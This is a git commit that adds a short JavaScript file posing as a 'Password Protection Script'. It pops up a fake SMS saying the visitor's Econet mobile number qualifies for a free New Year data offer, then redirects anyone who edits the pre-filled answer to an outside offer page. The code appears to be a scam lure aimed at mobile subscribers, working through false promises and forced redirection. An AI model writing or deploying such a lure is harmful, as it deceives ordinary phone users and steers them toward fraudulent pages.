e75394257d7a29ee3bd00c33dfd18e86ae699f92
ukpeha2026-maker <ukpeha2026@gmail.com>
2025-12-30 16:24:26 +0100

    Create actiave-econet.js

---
+++ actiave-econet.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ACTIVATE FREE DATA'
+password = prompt(
+  'SMS: Congratulations! Your econet number is eligible to receive New Year Offer from Joy Afta Joy. Please press OK to Actiavte Data now.',
+  'ACTIVATE FREE DATA'
+);
+if (password != 'ACTIVATE FREE DATA') {
+  location.href = 'https://offres.org/econet-newyr.html';
+}
